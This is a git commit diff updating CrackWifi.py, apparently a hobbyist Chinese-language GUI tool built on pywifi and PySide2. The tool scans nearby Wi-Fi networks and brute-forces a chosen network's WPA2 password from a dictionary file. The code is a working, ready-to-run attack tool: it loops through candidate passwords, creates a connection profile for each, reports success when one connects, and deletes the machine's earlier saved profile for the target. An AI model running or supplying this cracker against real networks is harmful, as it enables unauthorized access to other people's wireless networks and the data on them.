49e949e1864720c78529246d5b74a07f69a72e8a
PrideAssassin <928257570@qq.com>
2026-05-08 23:50:27 +0800

    更新v3.0版本

--- CrackWifi.py
+++ CrackWifi.py
@@ -1,18 +1,21 @@
-import os
-import sys
-import copy
+# import os
+# import sys
+# import copy
 import threading
 import pywifi
 from pywifi import const
 import time
 from PySide2.QtWidgets import *
 from PySide2.QtUiTools import QUiLoader
-from PySide2.QtCore import QFile,QStringListModel
+from PySide2.QtCore import QFile, QStringListModel
 
 
-class wifi():
-    wifi = pywifi.PyWiFi()  # 获取接口信息
-    iface = wifi.interfaces()[0]  # 获取第一个无线网卡接口
+class Wifi:
+    wifi = pywifi.PyWiFi()
+    try:
+        iface = wifi.interfaces()[0]  # 返回的是一个列表，取第一个wifi网卡
+    except Exception as e:
+        print("获取网卡列表失败:", e)
 
     # 获取当前无线网卡信息
     def get_nic(self):
@@ -21,130 +24,118 @@ class wifi():
     # 扫描的wifi列表信息
     def scan_wifi_list(self):
         self.iface.disconnect()  # 断开当前wifi连接
+        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]  # 检查网卡是否处于断开状态
         self.iface.scan()  # 扫描附近AP
-        time.sleep(1)  # 等待扫描完成(扫描需要时间)
+        time.sleep(2)  # 等待扫描完成
         results = self.iface.scan_results()  # 获取扫描结果
         ap_set = set()  # 创建一个set集合，用来存放扫描结果，用来对扫描结果进行去重复处理
         for x in results:
-            ap_name = x.ssid
-            ap_set.add(ap_name)
+            # ap_name = x.ssid
+            ap_set.add(x.ssid)
         global ap_list
-        ap_list =list(ap_set)
-        # print(ap_list)
-        model_list=QStringListModel()
+        ap_list = list(ap_set)
+        model_list = QStringListModel()
         model_list.setStringList(ap_list)
         return model_list
 
     # 开始破解
-    def Crack(self,status_list):
-        # print("被调用")
-        # 设置配置文件
-        profile = pywifi.Profile()
+    def Crack(self, status_list):
+        status_list.clear()
         global ssid_name
-        profile.ssid = ssid_name
-        profile.auth = const.AUTH_ALG_OPEN
-        profile.akm.append(const.AKM_TYPE_WPA2PSK)
-        profile.cipher = const.CIPHER_TYPE_CCMP
         # 读取字典
         try:
             global path
             if path[0] != " ":
-                print("字典已选择"+path[0])
-        except:
+                print("字典已选择" + path[0])
+        except Exception as e:
             print("未选择字典")
             return
         file = open(path[0], "r")
-        N=0         # 循环计数用
+        N = 1  # 循环计数用
+        profiles = self.iface.network_profiles()
+        # 遍历所有配置文件
+        for profile in profiles:
+            if profile.ssid == ssid_name:
+                print(f"发现旧的 '{ssid_name}' 配置，正在移除以确保使用新密码...")
+                self.iface.remove_network_profile(profile)
+                break  # 找到并删除后即可退出循环
         while True:
-            password = file.readline()  # 因为\n的存在所以这里if判断直接写了>=9
-            if len(password) >= 9:
+            self.iface.disconnect()  # 断开当前wifi连接
+            if 'tmp_profile' in locals():
+                self.iface.remove_network_profile(tmp_profile)
+            # 设置配置文件
+            profile = pywifi.Profile()
+            profile.ssid = ssid_name
+            profile.auth = const.AUTH_ALG_OPEN
+            profile.akm.append(const.AKM_TYPE_WPA2PSK)
+            profile.cipher = const.CIPHER_TYPE_CCMP
+            password = file.readline().strip()  # 因为\n的存在所以这里if判断直接写了>=9
+            if len(password) >= 8:
                 profile.key = password
-                profile = self.iface.add_network_profile(profile)
-                self.iface.connect(profile)
-                time.sleep(3)
+                tmp_profile = self.iface.add_network_profile(profile)
+                self.iface.connect(tmp_profile)
+                time.sleep(5)
                 if self.iface.status() == const.IFACE_CONNECTED:
-                    # print("破解成功，密码:" + password)
-                    status_list.addItem("破解成功，密码:" + password.rstrip('\n'))
+                    status_list.addItem(f"{N}. 破解成功.密码：{password.rstrip()}")
+                    status_list.scrollToBottom()
                     file.close()
                     return
                 # print("尝试密码:" + password.rstrip('\n'))
-                status_list.addItem("尝试密码:" + password.rstrip('\n'))
-                N=N+1
+                status_list.addItem(f"{N}. 尝试密码：{password.rstrip()}")
+                status_list.scrollToBottom()
+                N += 1
             elif len(password) == 0:
-                status_list.addItem("未找到密码")
+                status_list.addItem(f"{N}. 未找到密码")
+                status_list.scrollToBottom()
                 return
             else:
                 continue
 
+
 class Stats:
     def __init__(self):
+        self.wifi = Wifi()
+
         # 从文件加载UI界面
-        qfile_stats = QFile("d:\\temp\\temp\\ui_Main.ui")
+        qfile_stats = QFile("ui_Main.ui")
         qfile_stats.open(QFile.ReadOnly)
         qfile_stats.close()
-        self.ui=QUiLoader().load(qfile_stats)
+        self.ui = QUiLoader().load(qfile_stats)
 
         # UI界面设置网卡信息
-        self.ui.NIC.setText(wifi().get_nic())
-        self.ui.auth.setText("const.AUTH_ALG_OPEN")
-        self.ui.safe.setText("const.AKM_TYPE_WPA2PSK")
-        self.ui.pass_type.setText("const.CIPHER_TYPE_CCMP")
+        self.ui.comboBox.addItem(self.wifi.get_nic())
+        # self.ui.auth.setText("const.AUTH_ALG_WPA2PSK")
+        # self.ui.safe.setText("const.AKM_TYPE_WPA2PSK")
+        # self.ui.pass_type.setText("const.CIPHER_TYPE_CCMP")
 
-        # 扫描wifi按钮绑定事件
-        self.ui.scan_wifi.clicked.connect(self.scan)
-        # 选择字典按钮事件
-        self.ui.select_dict.clicked.connect(self.path)
-        # 破解按钮绑定事件
-        self.ui.Start_Crack.clicked.connect(self.Crack)
-        # list被选中
-        self.ui.wifi_list.clicked.connect(self.select_wifi_list)
+        self.ui.scan_wifi.clicked.connect(self.scan)    # 扫描wifi按钮绑定事件
+        self.ui.select_dict.clicked.connect(self.path)   # 选择字典按钮事件
+        self.ui.wifi_list.clicked.connect(self.select_wifi_list)    # list被选中
+        self.ui.Start_Crack.clicked.connect(self.Crack)  # 破解按钮绑定事件
 
-
-    # 点击扫描wifi按钮的绑定事件
     def scan(self):
-        # UI界面设置获取的扫描结果
-        APs =wifi().scan_wifi_list()
+        APs = self.wifi.scan_wifi_list()   # UI界面设置获取的扫描结果
         self.ui.wifi_list.setModel(APs)
 
     def path(self):
         global path
-        path=QFileDialog.getOpenFileName()
+        path = QFileDialog.getOpenFileName()
         self.ui.textBrowser.setText(path[0])
-
 
     def select_wifi_list(self, item):
         global ap_list
         global ssid_name
-        ssid_name=ap_list[item.row()]
+        ssid_name = ap_list[item.row()]
         self.ui.ssid.setText(ssid_name)
 
     def Crack(self):
         # 防止界面卡死，开启多线程运行，后台破解
-        t1 = threading.Thread(target=wifi().Crack,args=(self.ui.status_list,))
+        t1 = threading.Thread(target=self.wifi.Crack, args=(self.ui.status_list,))
         t1.start()
 
 
 if __name__ == '__main__':
     app = QApplication([])
-    stats1=Stats()
+    stats1 = Stats()
     stats1.ui.show()
     app.exec_()
-
-
-"""
-这段被注释了，暂时不用，
-print(''' 
-          ------------------------WIFI破解工具------------------------------------------                                                                        
-          |   注意事项:                                                     
-          |   1.使用时必须将字典和脚本放在同一目录,并将字典重命名为:zd.txt         
-          |   2.确认机器带有无线网卡                                          
-          |   3.扫描附近wifi时,若10s没有刷新出wifi列表,请按下:回车键                            
-          |   4.自动忽略字典中8位数以下的密码   
-          |   5.会删除本机以前连接过的wifi配置信息                                     v1.0
-          |                                                          作者:PrideAssassin
-          ----------------------------------------------------------------------------- 
-      ''')
-select = input("\n需要删除以前wifi连接信息，确定是否继续：Y/N\n")
-if select not in "Yy":
-    sys.exit()
-"""
